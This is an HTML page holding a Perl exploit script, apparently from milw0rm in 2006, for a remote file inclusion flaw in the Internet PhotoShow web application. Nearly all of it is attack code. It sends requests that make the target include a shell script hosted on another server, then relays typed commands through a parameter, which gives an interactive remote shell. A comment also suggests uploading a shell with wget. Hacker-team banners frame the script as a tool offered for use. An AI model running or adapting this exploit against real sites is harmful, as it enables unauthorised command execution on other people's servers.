<html><head><title>Internet PhotoShow (page) Remote File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
#
# Exploit by Hessam-x (www.hessamx.net)
# sub usage()
# {
 #print &quot; Usage: perl hx.pl [host] [cmd shell] [cmd shell variable]\r\n\n&quot;;
 #print &quot; example : perl hx.pl www.milw0rm.com milw0rm.com/hx.txt cmd&quot;;
 #exit();
 #}
######################################################
#  ___ ___                __                         #
# /   |   \_____    ____ |  | __ ___________________ #
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   / #
#\    Y    // __ \\  \___|    &lt;\  ___/|  | \//    /  #
# \___|_  /(____  )\___  &gt;__|_ \\___  &gt;__|  /_____ \ #
#       \/      \/     \/     \/    \/            \/ #
#             Iran Hackerz Security Team             #
#               WebSite: www.hackerz.ir              #
#                 DeltaHAcking Team                  #
#           website: www.deltahacking.com            #
######################################################
#  Internet PhotoShow Remote File Inclusion Exploit  #
######################################################
# upload a shell with this xpl:
# wget http://shell location/
use LWP::UserAgent;
print &quot;-------------------------------------------\n&quot;;
print &quot;=             Internet PhotoShow          =\n&quot;;
print &quot;=       By Hessam-x  - www.hackerz.ir     =\n&quot;;
print &quot;-------------------------------------------\n\n&quot;;


$bPath = $ARGV[0];
$cmdo = $ARGV[1];
$bcmd = $ARGV[2];

if($bPath!~/http:\/\// || $cmdo!~/http:\/\// || !$bcmd){usage()}



while()
{
       print &quot;Hessam-x@PhotoShow \$&quot;;
while(&lt;STDIN&gt;)
       {
               $cmd=$_;
               chomp($cmd);

$xpl = LWP::UserAgent-&gt;new() or die;
$req = HTTP::Request-&gt;new(GET =&gt;$bpath.'index.php?page='.$cmdo.'?&amp;'.$bcmd.'='.$cmd)or die &quot;\n[-] Could not connect !\n&quot;;

$res = $xpl-&gt;request($req);

$return = $res-&gt;content;
$return =~ tr/[\n]/[ê]/;

if (!$cmd) {print &quot;\n[!] Please type a Command\n\n&quot;; $return =&quot;&quot;;}

elsif ($return =~/failed to open stream: HTTP request failed!/)
       {print &quot;\n[-] Could Not Connect to cmd Host\n&quot;;exit}
elsif ($return =~/^&lt;b&gt;Fatal.error/) {print &quot;\n[-] Invalid Command\n&quot;}

if($return =~ /(.*)/)


{
       $freturn = $1;
       $freturn=~ tr/[ê]/[\n]/;
       print &quot;\r\n$freturn\n\r&quot;;
       last;
}

else {print &quot;Hessam-x@PhotoShow \$&quot;;}}}last;


sub usage()
 {
print &quot;[!] Usage : hx.pl [host] [cmd shell location] [cmd shell variable]\n&quot;;
print &quot; - E.g : hx.pl http://www.milw0rm.com http://www.milw0rm.com/shell.txt cmd\n&quot;;
 exit();
 }

# milw0rm.com [2006-04-18]</pre></html>